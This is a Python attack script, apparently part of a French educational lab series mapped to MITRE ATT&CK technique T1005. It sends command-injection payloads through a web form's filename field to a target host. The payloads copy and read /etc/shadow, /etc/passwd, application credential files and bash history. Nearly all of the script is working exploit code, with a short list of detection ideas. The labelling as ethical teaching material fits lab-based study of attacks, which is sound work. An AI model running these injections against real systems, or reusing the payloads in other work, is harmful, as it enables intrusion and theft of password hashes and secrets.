#!/usr/bin/env python3
"""
Phase 5 : Collection (Collecte de Données)
MITRE ATT&CK : TA0009 - Collection
Technique : T1005 - Data from Local System

Copyright © 2025 Mohammed Bencheikh - Be One And Move Academy
USAGE ÉDUCATIF ET ÉTHIQUE UNIQUEMENT

Description :
Cette phase collecte des données sensibles du système compromis.
L'attaquant, ayant obtenu les privilèges root, peut maintenant accéder
à tous les fichiers du système, y compris les mots de passe hashés.

Objectif pédagogique :
- Comprendre quelles données sont ciblées par les attaquants
- Observer les accès aux fichiers sensibles dans les logs
- Identifier les patterns de collecte de données

Référence MITRE ATT&CK :
https://attack.mitre.org/techniques/T1005/
"""

import requests
import sys
import json

# Mapping MITRE ATT&CK détaillé
MITRE_MAPPING = {
    "technique_id": "T1005",
    "technique_name": "Data from Local System",
    "tactic_id": "TA0009",
    "tactic_name": "Collection",
    "url": "https://attack.mitre.org/techniques/T1005/",
    "description": "Les adversaires peuvent rechercher des sources de données locales, telles que des systèmes de fichiers ou des bases de données locales, pour trouver des fichiers d'intérêt et des informations sensibles avant l'exfiltration.",
    "detection": [
        "Surveiller les accès aux fichiers sensibles (/etc/shadow, /etc/passwd)",
        "Détecter les commandes de recherche de fichiers (find, grep, locate)",
        "Alerter sur les lectures de fichiers de configuration contenant des secrets"
    ],
    "data_sources": [
        "File: File Access",
        "Command: Command Execution",
        "Process: Process Creation"
    ]
}

def collect_sensitive_data(target_ip, target_port):
    """
    Collecte des données sensibles depuis le système compromis.
    
    Cibles de collecte :
    1. /etc/shadow : Hashes des mots de passe
    2. /etc/passwd : Liste des utilisateurs
    3. /srv/secrets/ : Dossier contenant des credentials factices
    4. Historique bash : Commandes précédemment exécutées
    """
    
    url = f"http://{target_ip}:{target_port}/search"
    
    print(f"[*] Phase 5 : Collection de données sensibles")
    print(f"[*] MITRE ATT&CK : {MITRE_MAPPING['technique_id']} - {MITRE_MAPPING['technique_name']}")
    print(f"[*] Référence : {MITRE_MAPPING['url']}")
    print(f"")
    
    collected_data = {}
    
    # Cible 1 : /etc/shadow (nécessite root)
    print(f"[*] Collecte 1/4 : Extraction de /etc/shadow...")
    shadow_cmd = "sudo cat /etc/shadow"
    payload = f"test.txt'; {shadow_cmd} > /tmp/shadow_copy #"
    
    try:
        requests.post(url, data={'filename': payload}, timeout=10)
        
        # Vérification
        verify_cmd = "ls -la /tmp/shadow_copy && wc -l /tmp/shadow_copy"
        payload_verify = f"test.txt'; {verify_cmd} #"
        response = requests.post(url, data={'filename': payload_verify}, timeout=10)
        
        if "shadow_copy" in response.text:
            print(f"[+] /etc/shadow copié vers /tmp/shadow_copy")
            collected_data["shadow"] = {
                "status": "success",
                "location": "/tmp/shadow_copy",
                "description": "Hashes des mots de passe utilisateurs"
            }
        else:
            print(f"[-] Échec de la copie de /etc/shadow")
            collected_data["shadow"] = {"status": "failed"}
    
    except Exception as e:
        print(f"[-] Erreur : {e}")
        collected_data["shadow"] = {"status": "error", "message": str(e)}
    
    # Cible 2 : /etc/passwd
    print(f"\n[*] Collecte 2/4 : Extraction de /etc/passwd...")
    passwd_cmd = "cat /etc/passwd"
    payload = f"test.txt'; {passwd_cmd} > /tmp/passwd_copy #"
    
    try:
        requests.post(url, data={'filename': payload}, timeout=10)
        print(f"[+] /etc/passwd copié vers /tmp/passwd_copy")
        collected_data["passwd"] = {
            "status": "success",
            "location": "/tmp/passwd_copy",
            "description": "Liste des utilisateurs système"
        }
    except Exception as e:
        collected_data["passwd"] = {"status": "error", "message": str(e)}
    
    # Cible 3 : Secrets d'application
    print(f"\n[*] Collecte 3/4 : Extraction des secrets d'application...")
    secrets_cmd = "sudo cat /srv/secrets/credentials.txt"
    payload = f"test.txt'; {secrets_cmd} > /tmp/app_secrets #"
    
    try:
        requests.post(url, data={'filename': payload}, timeout=10)
        
        # Lecture du contenu
        read_cmd = "cat /tmp/app_secrets"
        payload_read = f"test.txt'; {read_cmd} #"
        response = requests.post(url, data={'filename': payload_read}, timeout=10)
        
        if "DATABASE_PASSWORD" in response.text or "API_KEY" in response.text:
            print(f"[+] Secrets d'application collectés :")
            print(f"    - DATABASE_PASSWORD trouvé")
            print(f"    - API_KEY trouvé")
            collected_data["secrets"] = {
                "status": "success",
                "location": "/tmp/app_secrets",
                "description": "Credentials d'application (DB, API)",
                "content_preview": "DATABASE_PASSWORD et API_KEY extraits"
            }
        else:
            collected_data["secrets"] = {"status": "failed"}
    except Exception as e:
        collected_data["secrets"] = {"status": "error", "message": str(e)}
    
    # Cible 4 : Historique des commandes
    print(f"\n[*] Collecte 4/4 : Extraction de l'historique bash...")
    history_cmd = "cat /home/webuser/.bash_history"
    payload = f"test.txt'; {history_cmd} > /tmp/bash_history_copy #"
    
    try:
        requests.post(url, data={'filename': payload}, timeout=10)
        print(f"[+] Historique bash copié vers /tmp/bash_history_copy")
        collected_data["history"] = {
            "status": "success",
            "location": "/tmp/bash_history_copy",
            "description": "Historique des commandes de l'utilisateur"
        }
    except Exception as e:
        collected_data["history"] = {"status": "error", "message": str(e)}
    
    # Résumé de la collecte
    print(f"\n[+] Phase de collecte terminée !")
    print(f"[+] Données collectées : {sum(1 for v in collected_data.values() if v.get('status') == 'success')}/4")
    
    result = {
        "success": True,
        "technique": MITRE_MAPPING["technique_id"],
        "technique_name": MITRE_MAPPING["technique_name"],
        "tactic": f"{MITRE_MAPPING['tactic_id']} - {MITRE_MAPPING['tactic_name']}",
        "mitre_url": MITRE_MAPPING["url"],
        "collected_data": collected_data,
        "detection_methods": MITRE_MAPPING["detection"],
        "data_sources": MITRE_MAPPING["data_sources"],
        "impact": "Accès complet aux credentials et données sensibles du système"
    }
    
    return result

def main():
    if len(sys.argv) < 3:
        print("Usage : python3 phase5_collection.py <TARGET_IP> <TARGET_PORT>")
        print("Exemple : python3 phase5_collection.py 172.20.0.3 5000")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    result = collect_sensitive_data(target_ip, target_port)
    
    print("\n" + "="*70)
    print("RÉSULTAT DE L'ATTAQUE (JSON) - MITRE ATT&CK MAPPING")
    print("="*70)
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    return result

if __name__ == "__main__":
    main()
